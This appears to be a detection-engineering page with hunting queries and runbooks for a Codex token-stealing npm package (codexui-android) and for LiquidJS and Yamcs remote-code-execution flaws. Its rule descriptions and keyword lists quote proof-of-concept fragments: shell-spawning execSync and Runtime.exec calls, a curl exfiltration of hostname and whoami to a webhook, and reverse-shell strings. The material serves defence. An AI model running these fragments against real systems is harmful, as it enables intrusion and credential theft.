A polished Codex remote UI, the npm package codexui-android, has active development and thousands of weekly users. It has been quietly exfiltrating OpenAI auth tokens for the past month. Category: Vulnerabilities & Threats

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint · [LLM] Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Legitimate-Looking Codex Remote UI Secretly Steals Your AI Tokens
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) · [LLM] HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) · Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant
DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) AICommand & Control High
Hunts DNS resolution or outbound HTTPS to the attacker C2 anyclaw.store / sentry.anyclaw.store used by the trojanized codexui-android npm package and its companion Play Store apps to POST stolen Codex auth.json blobs to /startlog. Endpoint is deliberately named to blend with legitimate Sentry telemetry. Rationale: Domain sentry.anyclaw.store + path /startlog + User-Agent codexui/<ver> are unique strings from the article's exfil function. No legitimate use of anyclaw.store exists. Cross-checked: domain pattern matches Aikido's IOC publication and anyclaw.store appears as the only C2 host across both npm package and Android APK chains in the article. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1071.001 T1036.005 T1567
Data sourcesNetwork_Traffic.All_Traffic Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • None expected - anyclaw.store is wholly attacker-controlled with no legitimate business use
  • Security researchers / IR teams sandboxing the malicious package
  • Threat-intel platforms enriching the domain via active resolution
  • Internal threat-hunting tooling deliberately probing the IOC
Response runbook
1. Triage: pull the DeviceName/Computer + InitiatingProcessFileName for every hit; if InitiatingProcessFileName == node.exe or a node child of pnpm, treat as confirmed exfil. Pull DeviceFileEvents for ~/.codex/auth.json reads on the same host in the 5 min preceding the connection. 2. Contain: block anyclaw.store and *.anyclaw.store at the proxy / DNS sinkhole; isolate the affected developer endpoint; revoke and rotate the user's Codex/OpenAI session - force re-login from openai.com to invalidate stolen refresh_token; remove codexui-android from npm cache and node_modules. 3. Hunt: pivot to find every host that installed codexui-android@>=0.1.82 (look for pnpm/npm install events referencing the package), every Android device with gptos.intelligence.assistant or codex.app installed, and any other resolutions to *.anyclaw.store across the org.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any ("sentry.anyclaw.store","anyclaw.store") or RemoteUrl endswith ".anyclaw.store"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, ActionType
| order by Timestamp desc
union isfuzzy=true
  (DnsEvents
    | where TimeGenerated > ago(30d)
    | where Name endswith "anyclaw.store"
    | project TimeGenerated, Computer, ClientIP, Name, QueryType, ResultCode),
  (ImDnsActivity
    | where TimeGenerated > ago(30d)
    | where DnsQuery endswith "anyclaw.store"
    | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, Name=DnsQuery, QueryType=DnsQueryTypeName, ResultCode=DnsResponseCodeName),
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationHostName endswith "anyclaw.store" or RequestURL has "anyclaw.store/startlog" or RequestClientApplication startswith "codexui/"
    | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, Name=DestinationHostName, RequestURL, RequestClientApplication)
| order by TimeGenerated desc

npm/pnpm install of trojanized codexui-android package on developer endpoint AIDelivery High
Hunts the installation vector for the supply-chain attack - npm or pnpm pulling codexui-android (any version >= 0.1.82) onto a developer workstation or CI runner. The published npm artifact contains the malicious chunk-PUR7OUAG.js that the GitHub source does not. Rationale: `codexui-android` is the literal article-specific package name; chunk-PUR7OUAG.js is the unique malicious entry-point chunk only present in the npm artifact (never committed to GitHub). Either string in a node-tooling command line on a developer host is high-fidelity for this supply-chain attack. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes Endpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher / threat-hunter intentionally pulling the package in an isolated VM
  • CI pipeline that legitimately depended on the package before disclosure (pre-2026-04 historical hits)
  • Reproduction of an Aikido write-up by a fellow detection engineer
  • Internal mirror/proxy syncing the package metadata
Response runbook
1. Triage: confirm the user is a developer; confirm whether the install completed (look for a follow-on DeviceFileEvents write of node_modules/codexui-android/dist-cli/index.js or chunk-PUR7OUAG.js). Check if the user has ever signed into Codex from this host (DeviceFileEvents for ~/.codex/auth.json). 2. Contain: remove the package (npm uninstall -g codexui-android, delete node_modules entry); block anyclaw.store at egress; force the user to revoke and re-issue their Codex/OpenAI session, treating refresh_token as compromised. 3. Hunt: enumerate every host that installed the package and any DeviceNetworkEvents to *.anyclaw.store from that host in the install window; look for the matching Android Play Store apps (gptos.intelligence.assistant, codex.app) on MDM-managed mobile devices.
union isfuzzy=true
  (DeviceProcessEvents
    | where Timestamp > ago(60d)
    | where (InitiatingProcessFileName in~ ("npm.exe","pnpm.exe","yarn.exe","node.exe") or FileName in~ ("npm.exe","pnpm.exe","yarn.exe"))
    | where ProcessCommandLine has "codexui-android" or InitiatingProcessCommandLine has "codexui-android"
    | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath),
  (DeviceFileEvents
    | where Timestamp > ago(60d)
    | where FolderPath has "codexui-android" or FileName == "chunk-PUR7OUAG.js"
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, ProcessCommandLine=InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine=InitiatingProcessCommandLine, FolderPath)
| order by Timestamp desc
union isfuzzy=true
  (SecurityEvent
    | where TimeGenerated > ago(60d)
    | where EventID == 4688
    | where (NewProcessName endswith "\\npm.exe" or NewProcessName endswith "\\pnpm.exe" or NewProcessName endswith "\\yarn.exe" or NewProcessName endswith "\\node.exe" or ParentProcessName endswith "\\npm.exe" or ParentProcessName endswith "\\pnpm.exe")
    | where CommandLine has "codexui-android"
    | project TimeGenerated, Computer, Account=SubjectUserName, NewProcessName, CommandLine, ParentProcessName),
  (ImProcessCreate
    | where TimeGenerated > ago(60d)
    | where ActingProcessName has_any ("npm","pnpm","yarn","node") or ParentProcessName has_any ("npm","pnpm")
    | where ActingProcessCommandLine has "codexui-android" or ParentProcessCommandLine has "codexui-android"
    | project TimeGenerated, Computer=DvcHostname, Account=ActorUsername, NewProcessName=ActingProcessName, CommandLine=ActingProcessCommandLine, ParentProcessName)
| order by TimeGenerated desc

Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) AIActions on Objectives High
Hunts the credential-access primitive of the codexui-android malware - a node process whose module path lives under codexui-android/dist-cli/ opening the Codex OAuth token store at ~/.codex/auth.json or $CODEX_HOME/auth.json. This catches the file-read step regardless of whether C2 succeeds. Rationale: The article's exfil function explicitly resolves $CODEX_HOME/auth.json and reads the whole file. Filename auth.json + parent dir .codex + reader process node (or anything in a codexui-android path) is a tight, article-specific triple. Filtering on InitiatingProcessFolderPath containing codexui-android removes legitimate Codex CLI use. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1552.001 T1528 T1083
Data sourcesEndpoint.Filesystem Endpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate official Codex CLI reading its own auth.json during a normal user session
  • Developer running 'cat ~/.codex/auth.json' to debug their own token
  • Backup software enumerating the user's home directory
  • IDE plugin (e.g. official OpenAI VS Code extension) reading the token to authenticate
Suppression filter
| where InitiatingProcessFolderPath has "codexui-android" or InitiatingProcessCommandLine has_any ("codexui-android","chunk-PUR7OUAG.js","dist-cli/index.js")
Response runbook
1. Triage: confirm InitiatingProcessFolderPath or InitiatingProcessCommandLine contains codexui-android or chunk-PUR7OUAG.js - that disambiguates malicious from the legitimate Codex CLI. Correlate with DeviceNetworkEvents to anyclaw.store within +/-2 minutes. 2. Contain: kill the node process, isolate the host, revoke the user's Codex/OpenAI refresh_token via openai.com session management, and force re-authentication. Refresh tokens do not expire so revocation is critical. 3. Hunt: across the org, find every host that has ~/.codex/auth.json (DeviceFileEvents for the path) AND has installed codexui-android - those users' tokens must be treated as compromised since 0.1.82.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName == "auth.json"
| where FolderPath has_any ("\\.codex\\","/.codex/")
| where InitiatingProcessFileName in~ ("node.exe","node") or InitiatingProcessFolderPath has "codexui-android" or InitiatingProcessCommandLine has "codexui-android" or InitiatingProcessCommandLine has "chunk-PUR7OUAG.js" or InitiatingProcessCommandLine has "dist-cli/index.js"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, FolderPath, FileName, ActionType
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName == "auth.json"
| where TargetFilePath has_any ("\\.codex\\","/.codex/")
| where ActingProcessName has_any ("node","node.exe") or ActingProcessCommandLine has_any ("codexui-android","chunk-PUR7OUAG.js","dist-cli/index.js")
| project TimeGenerated, Computer=DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, EventType
| order by TimeGenerated desc

HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) AIActions on Objectives High
Hunts the exact exfil request shape - HTTPS POST to path /startlog with User-Agent matching ^codexui/<version>. Catches the malware even if the C2 domain is changed but URL/UA conventions remain. Targets proxy/firewall layer-7 telemetry. Rationale: Path /startlog and User-Agent prefix codexui/ are hard-coded in the article's httpsRequest options block. The UA prefix in particular is a self-identifying string the attacker chose - no legitimate Sentry SDK or anything else uses it. Catches mirror domains / IP fallbacks if the attacker rotates infrastructure. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1041 T1071.001 T1573
Data sourcesWeb.Web Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal app coincidentally exposing /startlog path (extremely unlikely; verify against asset inventory)
  • Security researcher posting deliberate test traffic to anyclaw.store
  • Honeypot / sinkhole infrastructure echoing the C2 path
  • Penetration test simulating the exact request shape
Response runbook
1. Triage: pull DeviceName/source-IP of the POST, identify the user, check if codexui-android is installed (npm ls / Android MDM inventory for gptos.intelligence.assistant or codex.app). 2. Contain: block sentry.anyclaw.store and *.anyclaw.store at egress; isolate the host; treat the user's Codex/OpenAI refresh_token as exfiltrated - revoke session via OpenAI account UI immediately (refresh tokens do not expire). 3. Hunt: search 60-day backwards for every POST to /startlog OR User-Agent starting with codexui/ across all proxy/firewall telemetry; pivot to every host that ever resolved anyclaw.store; review OpenAI/Codex audit logs for the affected user for anomalous source IPs or model invocations from unfamiliar geographies.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "/startlog" or RemoteUrl has "anyclaw.store"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
union isfuzzy=true
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where RequestMethod =~ "POST"
    | where RequestURL has "/startlog" or DestinationHostName endswith "anyclaw.store" or RequestClientApplication startswith "codexui/"
    | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, RequestMethod, RequestURL, DestinationHostName, UserAgent=RequestClientApplication, DeviceVendor, DeviceProduct),
  (ImWebSession
    | where TimeGenerated > ago(30d)
    | where HttpMethod =~ "POST"
    | where Url has "/startlog" or HttpHostName endswith "anyclaw.store" or HttpRequestHeaderUserAgent startswith "codexui/"
    | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, RequestMethod=HttpMethod, RequestURL=Url, DestinationHostName=HttpHostName, UserAgent=HttpRequestHeaderUserAgent, DeviceVendor=EventVendor, DeviceProduct=EventProduct),
  (W3CIISLog
    | where TimeGenerated > ago(30d)
    | where csMethod =~ "POST"
    | where csUriStem has "/startlog" or csUserAgent startswith "codexui/"
    | project TimeGenerated, Computer, ClientIP=cIP, RequestMethod=csMethod, RequestURL=csUriStem, DestinationHostName=sSiteName, UserAgent=csUserAgent, DeviceVendor="Microsoft", DeviceProduct="IIS")
| order by TimeGenerated desc

Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer) AIDelivery Medium
Hunts the mobile delivery vector - Play Store installs of the BrutalStrike author's apps that bootstrap the malicious codexui-android npm package inside a PRoot Linux userland. Both APKs share the app.anyclaw.* Kotlin namespace and register the anyclaw://auth/codex-callback URI scheme. Rationale: Article-specific package IDs gptos.intelligence.assistant and codex.app are named explicitly as the two Play Store apps that bootstrap the malicious codexui-android npm package on first launch. Kotlin namespace app.anyclaw.* and URI scheme anyclaw://auth/codex-callback are shared signatures across both APKs and are not used by any legitimate app. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1474.003 T1456
Data sourcesEndpoint.Application_State
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • User legitimately installed the app before disclosure (treat as compromised, not FP)
  • MDM test enrollment with the malicious APK as a test artifact
  • Mobile threat research team analysing the APK in a sandbox
  • Confusion with unrelated apps that happen to share the 'Codex' display name - validate on package id, not display name
Response runbook
1. Triage: list every Android device with gptos.intelligence.assistant or codex.app installed via MDM; identify if the user ever signed into Codex from the app (correlate with OpenAI audit logs for that user's account). 2. Contain: push an MDM uninstall policy for both package IDs; block sentry.anyclaw.store at corporate VPN / DNS egress; for every user who had the app, revoke their Codex/OpenAI session via openai.com - refresh tokens are non-expiring so they must be invalidated server-side. 3. Hunt: pivot to find every Codex API call to the user's account in the last 60 days from a source IP that doesn't match the user's typical geography/ASN; check whether the same publisher (BrutalStrike) has other apps in your org's MDM inventory (notably the Brutal Strike game with 5M+ installs).
DeviceInfo
| where Timestamp > ago(30d)
| where OSPlatform startswith "Android"
| join kind=inner (
    DeviceTvmSoftwareInventory
    | where SoftwareName in~ ("gptos.intelligence.assistant","codex.app","OpenClaw Codex Claude AI Agent","Codex")
         or SoftwareVendor has "anyclaw"
  ) on DeviceId
| project Timestamp, DeviceId, DeviceName, OSPlatform, OSVersion, SoftwareVendor, SoftwareName, SoftwareVersion
| order by Timestamp desc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(30d)
| where OSPlatform startswith "Android"
| where SoftwareName in~ ("gptos.intelligence.assistant","codex.app","OpenClaw Codex Claude AI Agent","Codex")
| project TimeGenerated, DeviceId, DeviceName, OSPlatform, OSVersion, SoftwareVendor, SoftwareName, SoftwareVersion
| order by TimeGenerated desc
@mobile.app.package_name:(gptos.intelligence.assistant OR codex.app) OR @mobile.app.namespace:app.anyclaw.* OR @mobile.app.intent_filter.scheme:anyclaw
NETWORK
index=mdm OR index=intune (app_package_name="gptos.intelligence.assistant" OR app_package_name="codex.app" OR app_package="app.anyclaw.*" OR app_bundle_id="gptos.intelligence.assistant" OR app_bundle_id="codex.app") | stats earliest(_time) as firstSeen latest(_time) as lastSeen values(device_name) as device values(user) as user values(app_version) as version by app_package_name | convert ctime(firstSeen) ctime(lastSeen)

ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

LiquidJS SSTI gadget tokens in inbound HTTP (CVE-2026-45618) AIExploitation High
Hunts for LiquidJS template-injection PoC strings — `1|valueOf`, `r.context.scopes`, `r.liquid.parser`, `r.liquid.options.fs`, `assign __proto__`, `process.getBuiltinModule`, `child_process`, `execSync` — appearing in inbound URLs, query strings, referers, or form bodies served by IIS / App Service / WAF-fronted Node.js apps embedding LiquidJS templates. Rationale: Anchored to literal LiquidJS PoC tokens (`1|valueOf`, `r.context.scopes`, `r.liquid.parser`, `r.liquid.options.fs`, `assign __proto__`, `getBuiltinModule`, `child_process`, `execSync`, `fs.readFileSync`) — none of these are legitimate query-string contents and they are unique to the GHSA-gf2q-c269-pqgc gadget chain. Cross-checked against the GitHub advisory and the LiquidJS NPM page for fix version 10.26.0. Cross-checked against: • https://github.com/advisories/GHSA-gf2q-c269-pqgc • https://www.npmjs.com/package/liquidjs • https://attack.mitre.org/techniques/T1190/
ATT&CKT1190 T1059.007
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal security scanners (Burp/ZAP/Nuclei) firing CVE-2026-45618 templates from a known scanner IP
  • Developers pasting the PoC into a dev/staging environment while validating the patch
  • Bug-bounty researchers exercising the gadget on a public asset
  • WAF / IDS rule-test traffic from CrowdStrike/Cloudflare/Akamai validation jobs
  • Documentation / blog ingestion crawlers that include the PoC snippet in fetched URLs
Suppression filter
| where not(RemoteIP in ("<internal_scanner_cidr>")) and InitiatingProcessCommandLine !has "burp-collaborator" and RemoteUrl !contains "nuclei-templates"
Response runbook
Step 1 — Triage: confirm the LiquidJS-rendered app (`node.exe` / `w3wp.exe`) actually processed the request (HTTP 200 vs 4xx/WAF block), capture client IP + UA, and check whether the app is on a vulnerable LiquidJS version (<10.26.0) via `npm ls liquidjs` on the host. Step 2 — Contain: if the version is vulnerable AND the request returned 2xx, block the source IP at the WAF/edge, isolate the app host in Defender, and rotate any secrets, SSH keys, and database creds reachable from that process. Step 3 — Hunt: pivot on the source IP and `node.exe` PID across DeviceNetworkEvents / DeviceProcessEvents in the prior 24h, look for `node.exe`-spawned shells (UC #2), outbound connections from the app to non-baseline IPs, and any `fs.readFileSync` / `/etc/passwd`-style file reads written to disk.
DeviceNetworkEvents

| where ActionType in ("InboundConnectionAccepted","ConnectionInbound","ConnectionSuccess")
   or InitiatingProcessFileName in~ ("node.exe","w3wp.exe","iisexpress.exe")

   or AdditionalFields has_any ("1|valueOf","r.context.scopes","r.liquid.parser","__proto__","getBuiltinModule","child_process")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, LocalPort, AdditionalFields
| order by Timestamp desc

Node.js web process spawning shell (LiquidJS RCE post-exploit) AIExploitation High
Detects `node.exe` (or Linux `node`) — and IIS-hosted Node via `iisnode`/`w3wp.exe` running a Node app — spawning an interactive shell (`sh`, `bash`, `cmd.exe`, `powershell.exe`) immediately after the LiquidJS PoC executes `process.getBuiltinModule('child_process').execSync('sh', {stdio:'inherit'})`. This child-shell pattern is the deterministic post-exploit signal of CVE-2026-45618. Rationale: PoC ends with `process.getBuiltinModule('child_process').execSync('sh', {stdio:'inherit'})` — so the deterministic post-exploitation signal is `node` (or `w3wp.exe` hosting `iisnode`) becoming the parent of an interactive shell. node→sh is exceedingly rare in production: Node apps almost never `exec` a TTY-bearing shell. Cross-checked against the GHSA PoC body and standard Node.js production process trees. Cross-checked against: • https://github.com/advisories/GHSA-gf2q-c269-pqgc • https://attack.mitre.org/techniques/T1059/004/ • https://attack.mitre.org/techniques/T1190/
ATT&CKT1059 T1190 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Node-based build / CI agents shelling out to `bash` for `npm postinstall` or `node-gyp` native compilation
  • Developer Node REPL sessions running `child_process.exec` for diagnostics on a workstation
  • Self-hosted tools like `pm2`, `forever`, `nodemon` restarting child processes via shell
  • Webhook-driven deploy scripts where Node legitimately spawns `bash deploy.sh`
  • Headless browser frameworks (Puppeteer/Playwright) under Node spawning shell helpers during install
Suppression filter
| where InitiatingProcessCommandLine !has_any ("npm ","yarn ","pnpm ","node-gyp","pm2 ","nodemon","postinstall","prebuild","node_modules\\.bin") and ProcessCommandLine !has_any ("deploy.sh","build.sh","--login -c npm")
Response runbook
Step 1 — Triage: pull the full parent (`node` / `w3wp.exe`) command line and confirm the parent is a production-serving process (not pm2/npm install/build agent). Correlate within ±2 minutes against UC #1 — an inbound HTTP request containing LiquidJS gadget tokens is the smoking gun. Step 2 — Contain: isolate the host in Defender, kill the shell + parent `node` PID, capture process memory if EDR supports it, and block the source IP at the perimeter. Rotate any secrets readable by the service-account that ran `node` (DB creds, cloud IAM, SSH keys, `.env` files). Step 3 — Hunt: pivot on the `node` PID's children and grandchildren for the next 60 minutes (FileWritten, DnsRequest, NetworkConnectIP4), look for `/etc/passwd` reads, `whoami`/`id`/`hostname` recon, outbound C2, and `npm ls liquidjs` across the fleet to enumerate other vulnerable hosts.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node.exe","node","w3wp.exe","iisnode.exe")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","sh","bash","dash","zsh","ksh")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          InitiatingProcessTokenElevation, ProcessIntegrityLevel, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("node.exe","\\node","/node","w3wp.exe","iisnode.exe")
| where TargetProcessName has_any ("cmd.exe","powershell.exe","pwsh.exe","\\sh","/sh","/bash","/dash","/zsh","\\bash.exe")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine, EventVendor, EventProduct
| order by TimeGenerated desc

Yamcs JVM spawning OS shell/interpreter (Janino RCE via CVE-2026-44632) AIExploitation High
Hunts the Yamcs Java mission-control process (java/yamcsd) spawning a Unix shell or command interpreter (bash/sh/curl/wget/python/nc) as a child. The Janino SimpleCompiler RCE compiles attacker-supplied algorithm text containing java.lang.Runtime.getRuntime().exec(), so a JVM-parent → shell-child tree on a Yamcs host is the core post-exploitation signal that the injected algorithm executed. Rationale: Anchored on the article's PoC payload `java.lang.Runtime.getRuntime().exec(new String[]{"bash","-c","curl ..."})` — the deterministic post-exploitation artefact is a Yamcs JVM (java/yamcsd) parent forking a shell/network tool, which a mission-control JVM almost never does legitimately. Cross-checked against GHSA-524g-x36v-9wm6 and CIRCL Vulnerability-Lookup. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://vulnerability.circl.lu/vuln/ghsa-524g-x36v-9wm6 • https://github.com/yamcs/yamcs
ATT&CKT1059.004 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Gradle/Maven build agents (java) invoking sh wrapper scripts on a build box mistakenly running the Yamcs agent
  • JVM-based monitoring/APM agents forking shell helpers to collect host metrics (hostname, df)
  • Jenkins/CI Java agents spawning bash for pipeline steps
  • Yamcs operators legitimately configuring a Java algorithm that calls a sanctioned external script
  • Elasticsearch/other JVM services running a one-off diagnostic shell command
Suppression filter
| where not (ProcessCommandLine has_any ("gradle","maven","/jenkins/","metricbeat","df -","uname -") and InitiatingProcessCommandLine has_any ("gradle","jenkins","elasticsearch"))
Response runbook
1) TRIAGE: Pull the full process tree — confirm InitiatingProcessFileName is the Yamcs JVM and read the child ProcessCommandLine for `Runtime.getRuntime`, `curl`/`wget` to an external host, or reverse-shell strings (`bash -i`, `/dev/tcp`). Identify the AccountName running Yamcs. 2) CONTAIN: Isolate the Yamcs host, kill the child process tree, and rotate the Yamcs service account + any auth tokens with ChangeMissionDatabase privilege. Snapshot for forensics before remediation. 3) HUNT: Review the Yamcs HTTP/access logs for PATCH calls to /api/mdb/*/algorithms/* (UC2), pull outbound connections from the host (UC3), and verify yamcs-core is upgraded to >= 5.12.7; review every algorithm definition's text field for injected Java.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","yamcsd","yamcs")
| where FileName in~ ("bash","sh","dash","zsh","curl","wget","python","python3","nc","ncat","cmd.exe","powershell.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("java","yamcsd","yamcs")
| where TargetProcessName has_any ("bash","sh","dash","zsh","curl","wget","python","python3","nc","ncat","cmd.exe","powershell.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

Yamcs MDB algorithm override PATCH with Java Runtime payload AIDelivery Medium
Hunts authenticated HTTP PATCH requests to the Yamcs Mission Database algorithm override endpoint (/api/mdb/<instance>/<processor>/algorithms/...), the exact exploitation vector for CVE-2026-44632. High-fidelity when the request body / URL contains java.lang.Runtime or Runtime.getRuntime, indicating an injected OS-command payload rather than a benign algorithm edit. Rationale: Uses the exact endpoint shape from the PoC curl — `PATCH /api/mdb/<instance>/<processor>/algorithms/...` with `action:SET` and a `text` field embedding `java.lang.Runtime.getRuntime().exec()`. URL+method alone is a benign admin action so this is hunting-tier; the body/Message match on Runtime.getRuntime is what elevates fidelity where the WAF logs request bodies. Defender has no inbound web-server table for the Yamcs JVM, so defender_kql is intentionally empty. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://docs.yamcs.org/yamcs-server-manual/mdb/algorithm-definitions/
ATT&CKT1190 T1059
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate mission engineer editing an algorithm definition via the Yamcs web UI/REST API
  • Automated MDB deployment pipelines that push algorithm updates on release
  • Yamcs configuration-management tooling syncing algorithm text
  • Integration tests that PATCH algorithms against a staging Yamcs instance
  • Backup/restore tooling re-applying MDB definitions
Suppression filter
| where Message has_any ("java.lang.Runtime","Runtime.getRuntime","ProcessBuilder",".exec(","/bin/","bash -c")
Response runbook
1) TRIAGE: Inspect the captured request body/URL for the algorithm `text` field — benign edits contain math/expression logic; malicious ones contain `java.lang.Runtime`, `getRuntime().exec`, `ProcessBuilder`, or shell strings. Confirm the SourceUserName holds ChangeMissionDatabase and whether the source IP is an expected operator. 2) CONTAIN: Revoke the user's token, block the source IP at the proxy, and revert the altered algorithm definition in the MDB. 3) HUNT: Correlate to UC1 (JVM spawning a shell) on the Yamcs host within minutes of this PATCH, and review UC3 outbound callbacks. Confirm yamcs-core >= 5.12.7.
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL has "/api/mdb/" and RequestURL has "/algorithms/"
| where (Message has_any ("java.lang.Runtime","Runtime.getRuntime",".exec(") or DeviceCustomString1 has_any ("java.lang.Runtime","Runtime.getRuntime"))
   or RequestURL has "/algorithms/"
| project TimeGenerated, SourceIP, SourceUserName, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message
| order by TimeGenerated desc

Outbound recon callback from Yamcs host (curl/shell child of JVM to public IP) AICommand & Control High
Hunts external network connections initiated by a shell or download tool (curl/wget/bash/python/nc) whose parent is the Yamcs JVM. CVE-2026-44632's PoC payload exfiltrates host recon via `curl https://<webhook>/$(hostname)_$(whoami)`, so a java-parented curl reaching a public IP confirms successful RCE and data egress. Rationale: Targets the PoC's egress shape — a curl/shell child of the Yamcs JVM beaconing host recon (`$(hostname)_$(whoami)`) to an attacker webhook over a public IP. Distinct network pivot from UC1's process tree. Sentinel ASIM ImNetworkSession carries no initiating-parent-process lineage so sentinel_kql is left empty; SPL Network_Traffic lacks parent lineage and is therefore a coarser app-based approximation — the Defender/Falcon EDR queries are the authoritative form. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://vulnerability.circl.lu/vuln/ghsa-524g-x36v-9wm6
ATT&CKT1071.001 T1041 T1082
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
